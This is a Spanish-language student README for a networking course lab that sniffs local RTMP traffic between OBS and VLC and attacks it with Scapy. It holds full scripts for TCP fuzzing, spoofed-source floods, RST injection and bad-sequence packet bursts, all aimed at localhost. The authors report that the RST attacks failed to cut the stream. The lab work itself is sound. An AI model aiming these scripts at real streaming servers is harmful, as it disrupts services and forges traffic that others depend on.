#  Proyecto: Inyección y Análisis de Tráfico RTMP con Scapy (Tarea 3)

Este proyecto corresponde a la Tarea 3 del curso Taller de Redes y Servicios, y tiene como objetivo analizar e intervenir el tráfico de red RTMP generado por una transmisión local entre OBS Studio (emisor) y VLC (receptor) utilizando Scapy dentro de un contenedor Docker especializado.

En esta entrega se explora la manipulación directa del protocolo RTMP a través de la captura, análisis e inyección de paquetes TCP, incluyendo pruebas de fuzzing, spoofing y finalización de conexión mediante flags RST.


---

## Tabla de contenido

- [Información general](#información-general)
- [Tecnologías utilizadas](#tecnologías-utilizadas)
- [Características](#características)
- [Configuración](#configuración)
- [Pruebas Realizadas](#pruebas-realizadas)
- [Resultados](#resultados)
- [Estado del proyecto](#estado-del-proyecto)
- [Margen de mejora](#margen-de-mejora)
- [Expresiones de gratitud](#expresiones-de-gratitud)
- [Contacto](#contacto)

---

## Información general

Proyecto académico para el análisis de vulnerabilidades en transmisiones RTMP mediante manipulación de paquetes con Scapy. El sistema implementa:

✅ Sniffing de tráfico en tiempo real  
✅ Inyección de paquetes maliciosos  
✅ Técnicas de fuzzing y spoofing  
✅ Ataques de interrupción de conexión 


Objetivos:

- Levantar un servidor RTMP local
- Emitir en tiempo real desde OBS
- Recibir el stream con VLC
- Capturar y analizar los paquetes en Wireshark
- Intersectar el trafico con scapy
- Parar la trasmision con scapy

---

## Tecnologías utilizadas

- Ubuntu 22.04
- Docker 24+
- Python 3.11
- Scapy
- OBS Studio
- VLC Media Player
- Wireshark

---

##  Características

- Entorno experimental reproducible
- Captura en vivo de paquetes RTMP (puerto 1935)
- Scripts de inyección TCP con Scapy
- Fuzzing (payloads malformados)
- Spoofing (direcciones IP falsas)
- Intentos de cierre de conexión (RST)
- Observación de efectos en OBS y VLC

---


## Configuración


1. Crear contenedor Debian con permisos de red:

```bash
docker run -it --net=host --cap-add=NET_ADMIN --name scapy-container debian bash
```
2. Instalar dependencias dentro del contenedor:
```bash
apt update
apt install -y python3 python3-pip python3-venv nano net-tools
python3 -m venv /opt/scapy-venv
source /opt/scapy-venv/bin/activate
pip install --upgrade pip setuptools
pip install scapy

```
Scripts Implementados:
-sniffer.py
```bash
from scapy.all import *

def packet_handler(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 1935:
        print(f"[RTMP] {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport} | Seq: {pkt[TCP].seq}")

sniff(iface="lo", filter="tcp port 1935", prn=packet_handler)

```
- fuzz1.py


```
from scapy.all import *
import time


target_ip = "127.0.0.1"
target_port = 1935
num_packets = 100  
delay = 0.1 

for i in range(num_packets):
    # Construye el paquete con flags FPU + contador en el payload
    pkt = IP(dst=target_ip)/TCP(dport=target_port, flags="FPU")/Raw(load=f"Fuzz-FPU-{i}")
    send(pkt, verbose=0)  # verbose=0 para silenciar salida
    time.sleep(delay) 

```

- fuzz2.py


```
from scapy.all import *
import time

# Configuraci  n avanzada
target = "127.0.0.1"
port = 1935
packet_size = 2048  # bytes
packet_count = 50    # N  mero de paquetes a enviar
delay = 0.2          # Intervalo entre paquetes (segundos)

print(f"[+] Enviando {packet_count} paquetes de {packet_size} bytes a {target}:{port}...")

for i in range(1, packet_count + 1):
    # Paquete con payload   nico (contador + caracteres aleatorios)
    unique_payload = f"[PKT-{i}]".encode() + b"X" * (packet_size - 6)
    
    pkt = IP(dst=target)/TCP(dport=port)/Raw(load=unique_payload)
    send(pkt, verbose=0)
    
    print(f"Enviado paquete {i}/{packet_count} | Bytes: {len(pkt)}", end="\r")
    time.sleep(delay)

print("\n[+] Inyeccion completada. Analiza en Wireshark.")


```
- mod1_rst_real.py

```
from scapy.all import *

ip = IP(src="127.0.0.1", dst="127.0.0.1")
tcp = TCP(sport=46404, dport=1935, flags="R", seq=123456789)  # Reemplazar seq
pkt = ip/tcp

send(pkt)
print("Paquete RST enviado.")

```
- mod1_auto.py
```
from scapy.all import *
import time
import random

# Configuración
target_ip = "127.0.0.1"
target_port = 1935
num_packets = 50  # Cantidad de paquetes RST a enviar
delay = 0.1  # Segundos entre paquetes

def send_rst_attack():
    print(f"[+] Enviando {num_packets} paquetes RST a {target_ip}:{target_port}...")
    
    base_seq = random.randint(1000, 90000)  # Secuencia inicial aleatoria
    
    for i in range(num_packets):
        # Variamos secuencia y puerto origen para evadir posibles protecciones
        seq = base_seq + i
        sport = random.randint(49152, 65535)  # Puerto origen aleatorio (rango efímero)
        
        # Construimos el paquete RST con diferentes opciones
        pkt = IP(dst=target_ip)/TCP(
            sport=sport,
            dport=target_port,
            flags="R",
            seq=seq,
            window=0  # Ventana cero para mayor efectividad
        )/Raw(load=f"RST-{i}")  # Payload identificador
        
        send(pkt, verbose=0)
        print(f"Enviado RST {i+1}/{num_packets} | SEQ: {seq} | SPORT: {sport}", end="\r")
        time.sleep(delay)
    
    print("\n[+] Ataque RST completado")

send_rst_attack()
```

- mod2_spoof.py


```
from scapy.all import *
import random
import time

# Configuración
target_ip = "127.0.0.1"
target_port = 1935
spoofed_ip_base = "10.10.10."
num_packets = 100 
delay = 0.1  
def send_spoofed_packets():
    print(f"[+] Enviando {num_packets} paquetes spoofed a {target_ip}:{target_port}...")
    
    for i in range(num_packets):
        # Generamos IP origen spoofed diferente para cada paquete
        spoofed_ip = spoofed_ip_base + str(random.randint(1, 254))
        
        # Variamos parámetros TCP para cada paquete
        sport = random.randint(1024, 65535)  
        seq = random.randint(100000, 900000) 
        window = random.randint(512, 65535)  
        
        # Creamos el paquete con diferentes características
        pkt = IP(src=spoofed_ip, dst=target_ip, ttl=random.randint(32, 255))/TCP(
            sport=sport,
            dport=target_port,
            seq=seq,
            window=window,
            flags=random.choice(["S", "A", "PA"])  # Flags aleatorios
        )/Raw(load=f"SPOOFED-{i}-{spoofed_ip}")  # Payload identificador
        
        send(pkt, verbose=0)
        print(f"Enviado paquete {i+1}/{num_packets} | IP: {spoofed_ip} | SPORT: {sport}", end="\r")
        time.sleep(delay)
    
    print("\n[+] Ataque de spoofing completado")

send_spoofed_packets()

```
- mod3_seq.py

```
from scapy.all import *
import random
import time

# Configuración avanzada
target_ip = "127.0.0.1"
target_port = 1935
num_packets = 50           
base_delay = 0.1           
jitter = 0.05              

def send_bad_sequence_attack():
    print(f"[+] Iniciando ataque de secuencia inválida a {target_ip}:{target_port}")
    
    for i in range(1, num_packets + 1):
        # Generamos valores aleatorios para cada paquete
        seq = random.randint(900000, 9999999)  # Secuencia claramente fuera de rango
        sport = random.randint(49152, 65535)   # Puerto origen aleatorio (rango efímero)
        ttl = random.randint(16, 255)          # TTL variable
        
        pkt = IP(dst=target_ip, ttl=ttl)/TCP(
            sport=sport,
            dport=target_port,
            seq=seq,
            window=random.randint(512, 65535),  # Ventana TCP variable
            flags=random.choice(["S", "A", "PA", "FA"])  # Flags aleatorios
        )/Raw(load=f"BAD-SEQ-{i}-{seq}")  # Payload identificador
        
        send(pkt, verbose=0)
                current_delay = base_delay + random.uniform(-jitter, jitter)
        time.sleep(max(0.01, current_delay))  # Nunca menor a 10ms
        
        print(f"Enviado {i}/{num_packets} | SEQ: {seq} | SPORT: {sport} | TTL: {ttl}", end="\r")
    
    print("\n[+] Ataque completado")

send_bad_sequence_attack()

```
##  Pruebas Realizadas

- Captura de paquetes RTMP

- Spoofing de IP

- Fuzzing de payloads

- Inyección de paquetes RST

- Ataque en ráfaga de RSTs (burst)

- Observación en Wireshark y netstat


## Resultados

- Todos los paquetes fueron enviados correctamente.

- Nginx (contenedor) no aceptó los RSTs externos.

- La transmisión RTMP continuó estable (OBS y VLC sin interrupción).

Conclusión: El entorno experimental funcionó correctamente, pero el cierre de conexión fue bloqueado por la lógica de red del sistema (docker-proxy, kernel TCP stack, etc.).



## Estado del proyecto

El proyecto está: Finalizado

## Margen de mejora


- Probar ataques en red real (no solo localhost)

- Automatizar todo en un menú interactivo

- Recolectar métricas del servidor

- Generar logs y estadísticas

## Expresiones de gratitud

- Este proyecto se inspiró en el repositorio:
```https://github.com/iizukanao/node-rtsp-rtmp-server```

- Gracias a OBS, VLC, Wireshark y Scapy.

- Agradecimientos a mi equipo docente y compañeros

## Contacto

Creado por:
- Benjamín Guzmán
- Martin Huiriqueo
- Maximiliano Palma


